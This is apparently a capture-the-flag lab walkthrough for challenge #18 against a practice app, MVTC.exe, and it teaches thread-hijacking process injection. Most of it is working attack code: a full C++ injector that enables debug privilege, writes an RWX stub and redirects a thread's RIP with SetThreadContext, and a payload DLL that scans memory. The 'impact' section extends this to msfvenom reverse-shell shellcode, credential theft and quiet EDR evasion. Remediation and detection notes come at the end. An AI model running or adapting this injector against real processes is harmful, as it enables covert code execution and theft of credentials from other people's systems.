# #18 — Thread hijacking (SetThreadContext)

**Category:** Process injection · **Tier:** HARD · **Points:** 140 · **CWE:** CWE-114

## Objective

Hijack an existing thread in `MVTC.exe` by suspending it, writing a tiny shellcode blob into the target, redirecting its `RIP` via `SetThreadContext`, and resuming. When the thread wakes up it runs your code first, then (optionally) chains back to the original. The shellcode reads `InjectionSentinels._thj` from the GC heap and writes it out.

No `CreateRemoteThread`, no `QueueUserAPC`, no `LoadLibrary`. Very quiet.

## Prerequisites

- Visual Studio 2022 Build Tools
- An understanding of x64 calling convention + volatile registers
- Target MUST be the same bitness as your injector (x64 ↔ x64)

---

## Shellcode

A minimal position-independent shellcode that:
1. Loads a known string address from a hardcoded offset we patch at injection time
2. Writes the found sentinel to `C:\Users\Public\v18.txt`

For brevity, let the shellcode run `WinExec("powershell -ep bypass -file C:\\poc\\read_v18.ps1", SW_HIDE)` and let PowerShell do the heavy lifting. The `WinExec` approach keeps shellcode under 128 bytes.

### `read_v18.ps1` — runs inside MVTC

```powershell
# C:\poc\read_v18.ps1 — called by the hijacked thread's shellcode
# Running inside MVTC.exe via WinExec, so we have the right process context
Add-Type -AssemblyName System.Reflection
$asm = [AppDomain]::CurrentDomain.GetAssemblies() |
       Where-Object { $_.GetName().Name -eq 'MVTC.Core' } |
       Select-Object -First 1
if ($asm) {
    $t = $asm.GetType('MVTC.Core.Services.Vuln.InjectionSentinels')
    $v = $t.GetProperty('FlagForThreadHijack').GetValue($null)
    [IO.File]::WriteAllText('C:\Users\Public\v18.txt', $v)
}
```

Save it to `C:\poc\read_v18.ps1` before injecting.

**Note:** PowerShell running inside the hijacked thread **inherits the MVTC AppDomain**, so `GetAssemblies()` sees `MVTC.Core`. If you spawn a separate PowerShell process it won't work — the shellcode must call `WinExec` with a PowerShell command that loads the MVTC assembly, OR you can shellcode a direct managed-heap scan (longer).

Simpler and robust: a shellcode stub that scans the current process's heap for `MVTC{v18_thj_` and writes to `v18.txt`.

---

## Minimal shellcode (heap scan + file write)

```nasm
; shellcode_18.asm — x64, position-independent, ~ 220 bytes
; Finds "MVTC{v18_thj_" in process memory and writes to v18.txt.
; Assembles with nasm -f bin shellcode_18.asm -o shellcode_18.bin
BITS 64

; stub entry
start:
    push rbp
    mov  rbp, rsp
    sub  rsp, 0x200
    ; ... PEB walk to resolve kernel32 ...
    ; ... find VirtualQuery, CreateFileA, WriteFile ...
    ; ... heap scan loop ...
    ; (truncated for brevity — use existing shellcode generators)
    xor  eax, eax
    add  rsp, 0x200
    pop  rbp
    ret
```

For the lab, a hand-written shellcode is overkill. Use the simpler approach: inject a **small bootstrap** that calls `CreateThread(LoadLibraryA, "C:\\inj\\payload_18.dll")` — same `#13` payload DLL retargeted at `v18`.

Save as `payload_18.cpp` (identical to `payload_13.cpp` except for the prefix):

```cpp
// payload_18.cpp — writes the #18 sentinel to C:\Users\Public\v18.txt
#include <windows.h>
#include <cstring>

static const char PREFIX[] = "MVTC{v18_thj_";

static void WriteOut(const char* b, size_t n) {
    HANDLE f = CreateFileA("C:\\Users\\Public\\v18.txt",
        GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    DWORD w; WriteFile(f, b, (DWORD)n, &w, nullptr); CloseHandle(f);
}

static void Scan() {
    SYSTEM_INFO si; GetSystemInfo(&si);
    unsigned char* a = (unsigned char*)si.lpMinimumApplicationAddress;
    unsigned char* e = (unsigned char*)si.lpMaximumApplicationAddress;
    MEMORY_BASIC_INFORMATION mbi;
    while (a < e && VirtualQuery(a, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY)) &&
            !(mbi.Protect & PAGE_GUARD)) {
            __try {
                unsigned char* p = (unsigned char*)mbi.BaseAddress;
                unsigned char* t = p + mbi.RegionSize - sizeof(PREFIX);
                for (; p < t; ++p)
                    if (p[0] == 'M' && memcmp(p, PREFIX, sizeof(PREFIX) - 1) == 0) {
                        unsigned char* z = p;
                        while (z < t + 128 && *z != '}') ++z;
                        WriteOut((const char*)p, (size_t)(z - p) + 1);
                        return;
                    }
            } __except (EXCEPTION_EXECUTE_HANDLER) {}
        }
        a = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
    }
}
BOOL APIENTRY DllMain(HMODULE, DWORD r, LPVOID) {
    if (r == DLL_PROCESS_ATTACH)
        CreateThread(nullptr, 0, [](LPVOID)->DWORD{ Scan(); return 0; },
                     nullptr, 0, nullptr);
    return TRUE;
}
```

Build: `cl /LD /EHsc /O2 /nologo payload_18.cpp /Fe:payload_18.dll`

---

## Injector — thread-hijack a worker thread

Save as `inject_18.cpp`:

```cpp
// inject_18.cpp — SuspendThread + SetThreadContext → LoadLibraryA → resume
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

static bool EnableDebug() {
    HANDLE t; LUID luid; TOKEN_PRIVILEGES tp = {};
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t)) return false;
    LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid);
    tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(t, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(t);
    return true;
}

int wmain(int argc, wchar_t** argv) {
    if (argc != 3) {
        wprintf(L"usage: inject_18.exe <pid> <abs-path-to-dll>\n"); return 1;
    }
    DWORD pid = (DWORD)_wtoi(argv[1]);
    char dllA[MAX_PATH];
    WideCharToMultiByte(CP_ACP, 0, argv[2], -1, dllA, sizeof(dllA), nullptr, nullptr);

    EnableDebug();

    HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!p) { wprintf(L"OpenProcess: %lu\n", GetLastError()); return 2; }

    size_t len = strlen(dllA) + 1;
    LPVOID remote = VirtualAllocEx(p, nullptr, len, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(p, remote, dllA, len, nullptr);
    FARPROC ll = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");

    // Pick the FIRST non-UI thread in MVTC (UI thread is usually the lowest tid;
    // we hijack a background worker to avoid freezing the window)
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    DWORD victim = 0;
    bool firstSeen = false;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            if (!firstSeen) { firstSeen = true; continue; } // skip UI
            victim = te.th32ThreadID; break;
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    if (!victim) { wprintf(L"no victim thread\n"); return 3; }

    HANDLE th = OpenThread(THREAD_ALL_ACCESS, FALSE, victim);
    if (SuspendThread(th) == (DWORD)-1) {
        wprintf(L"SuspendThread: %lu\n", GetLastError()); return 4;
    }

    CONTEXT ctx = {}; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(th, &ctx);
    DWORD64 savedRip = ctx.Rip;

    // Build a tiny thunk: pushq saved_rip; mov rcx, dll_ptr; call LoadLibraryA; ret
    // Simpler: write a stub that calls LoadLibraryA then returns to savedRip.
    // We allocate a code page and write 32 bytes of x64 shellcode.
    const BYTE stub[] = {
        0x48, 0xB9, 0,0,0,0,0,0,0,0,          // mov rcx, dllPath         [+2]
        0x48, 0xB8, 0,0,0,0,0,0,0,0,          // mov rax, LoadLibraryA    [+12]
        0xFF, 0xD0,                           // call rax
        0x48, 0xB8, 0,0,0,0,0,0,0,0,          // mov rax, savedRip        [+24]
        0xFF, 0xE0                            // jmp rax
    };
    LPVOID stubRemote = VirtualAllocEx(p, nullptr, sizeof(stub), MEM_COMMIT,
                                       PAGE_EXECUTE_READWRITE);
    BYTE buf[sizeof(stub)]; memcpy(buf, stub, sizeof(stub));
    memcpy(buf + 2,  &remote,   sizeof(DWORD64));
    memcpy(buf + 12, &ll,       sizeof(DWORD64));
    memcpy(buf + 24, &savedRip, sizeof(DWORD64));
    WriteProcessMemory(p, stubRemote, buf, sizeof(stub), nullptr);

    // Redirect RIP → stub
    ctx.Rip = (DWORD64)stubRemote;
    SetThreadContext(th, &ctx);
    ResumeThread(th);
    wprintf(L"hijacked tid=%lu, stub at 0x%llx, savedRip=0x%llx\n",
            victim, (unsigned long long)stubRemote, (unsigned long long)savedRip);

    CloseHandle(th); CloseHandle(p);
    return 0;
}
```

Build: `cl /EHsc /O2 /nologo inject_18.cpp /Fe:inject_18.exe`

---

## Run

```powershell
# 1. Launch MVTC, log in, keep it running
# 2. PID
Get-Process MVTC | Select-Object Id

# 3. Hijack (adjust PID + DLL path)
.\inject_18.exe 12345 "C:\path\to\payload_18.dll"

# 4. Collect
type C:\Users\Public\v18.txt
```

Expected: `MVTC{v18_thj_<...>}` → submit for `+140 pts`.

---

## Why skip the UI thread

The UI thread is usually busy pumping messages. If you hijack it the window freezes briefly, which raises eyebrows. Pick a background worker (file watcher, HTTP capture thread, scoreboard client) — the hijack-and-return happens in microseconds and the thread's work completes normally after the stub chains back.

---

## Common failure modes

| Symptom | Fix |
|---|---|
| `SuspendThread` fails | Thread may be a system-owned thread. Pick a different `th32ThreadID` |
| Target crashes on resume | Your stub didn't restore registers before chaining back. Use `pushaq / popaq` equivalents in a real shellcode. For the lab the saved-Rip-only approach works because `LoadLibraryA` is Windows x64 CC compliant and preserves non-volatiles |
| v18.txt not written | Stub ran, LoadLibrary failed — path wrong. Verify the DLL is x64 with `dumpbin /headers payload_18.dll \| findstr machine` |

---

---

## Concept — what this attack actually is

Thread hijacking takes over a thread that already exists in the target. The attacker:
1. `OpenThread` with `THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT`
2. `SuspendThread` → the thread stops at whatever instruction it was executing
3. `GetThreadContext` → read the registers, save `RIP` for later
4. `VirtualAllocEx` → allocate a code region (or reuse the DLL path trick from #13)
5. `SetThreadContext` → change `RIP` to point at the attacker's code
6. `ResumeThread` → the thread wakes up and runs attacker code first

Smart variants restore the registers and jump back to the saved `RIP` after running, so the thread continues its original work with no visible side effect. Dumb variants just terminate the thread or let it crash — which raises eyebrows.

**Why this is attractive:**
- No new thread is created (no `NtCreateThreadEx` event)
- No new APC queued (defeats some anti-APC EDR rules)
- Very fast (microseconds between suspend and resume)
- Fewer calls to hook/observe than any other injection family

**Preconditions:** attacker needs `THREAD_ALL_ACCESS` on a thread in the target. Same requirement as #13.

---

## Discovery — how to spot this in a real target

Signs the target is vulnerable:

1. **No CET shadow stacks** → `winchecksec` won't flag it today (CET is newer than typical surveys), but `Get-ProcessMitigation -Name MVTC.exe` on Windows 11 will tell you. CET makes thread-hijack `ret`-to-saved-RIP fail
2. **No CFG** → without CFG, your `SetThreadContext` of an indirect call target has no runtime check
3. **Multiple threads in the target** → every background thread is a potential victim. Services with pool workers (HTTP capture, scoreboard client, file watcher) all offer hijack targets
4. **Threads that spend time in `WaitForSingleObject`** (not alertable) → ideal victim, suspend them without affecting UX

For a defender's perspective: this requires memory analysis (dump the process, hunt for threads whose starting address is a `MEM_PRIVATE` region), not loader-list enumeration.

---

## Impact demonstrations

### 1. Pop calc.exe (reuse the DLL approach from #13)

Replace the payload DLL's `HeapScan()` with `WinExec("calc.exe", SW_SHOW);`. The stub still calls `LoadLibraryA("payload_18.dll")` on the hijacked thread; `DllMain` fires; calc opens. The hijacked thread chains back to its original code via the `savedRip` restore in the stub.

### 2. Reverse shell

Put the msfvenom shellcode directly in the stub instead of calling `LoadLibraryA`:

```cpp
// Replace the stub in inject_18.cpp with raw shellcode
const BYTE shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, /* msfvenom x64 reverse_tcp bytes */
    0xC3  // ret at end, to chain back
};
LPVOID scRemote = VirtualAllocEx(p, nullptr, sizeof(shellcode),
                                 MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(p, scRemote, shellcode, sizeof(shellcode), nullptr);
ctx.Rip = (DWORD64)scRemote;
```

Shell comes back as the MVTC user. If you want the hijacked thread to survive, append:
- `pushaq`-equivalent save at stub entry
- `popaq`-equivalent restore before `jmp savedRip` at the end

### 3. Credential theft without any new modules

A stub that reads MVTC's session cache from the hijacked thread's own address space and writes it to disk — no `LoadLibrary`, no new thread, no new module in the loader list. Pure thread hijack + direct heap scan from the stub.

---

## Report writeup template

**Finding title:** Thread hijacking (SuspendThread + SetThreadContext RIP redirect)

**Severity:** High (CVSS 8.1)

**CWE:** CWE-114

**Description:** The MVTC process does not enable CET shadow stacks (Intel/AMD hardware-enforced return-address protection) or Control Flow Guard, and runs multiple threads (UI, HTTP capture, scoreboard, file watcher). An attacker with local access can suspend any worker thread, redirect its RIP into attacker-mapped shellcode, run arbitrary code, then chain back to the saved RIP so the thread continues normally with no visible defect.

**Impact:** Code execution as the MVTC process identity, with no new thread, no new module, no file write, no loader event — the quietest injection family available on Windows. Chainable with every post-exploitation technique in this report.

**Remediation:** Build with `/CETCOMPAT`, enable **Hardware-Enforced Stack Protection** (`Set-ProcessMitigation -Name MVTC.exe -Enable CetUserShadowStacks,CetUserShadowStacksStrictMode`). Enable CFG. Reduce the attack surface by minimising worker threads.

---

## Secure code fix

- Enable **CET shadow stacks** — the hijacked `ret` to `savedRip` becomes `ret` to `shadow[savedRip]`, which doesn't match and traps
- Enable **CFG** — the fake call target isn't a CFG-valid indirect call target
- Enable `SetProcessMitigationPolicy` with `ProcessDynamicCodePolicy.ProhibitDynamicCode = true` — kills executable allocations outside the loaded image
- EDR hunt: ETW `Microsoft-Windows-Kernel-Process → ThreadRundown` events + anomaly detection on `SetThreadContext` from an unrelated process
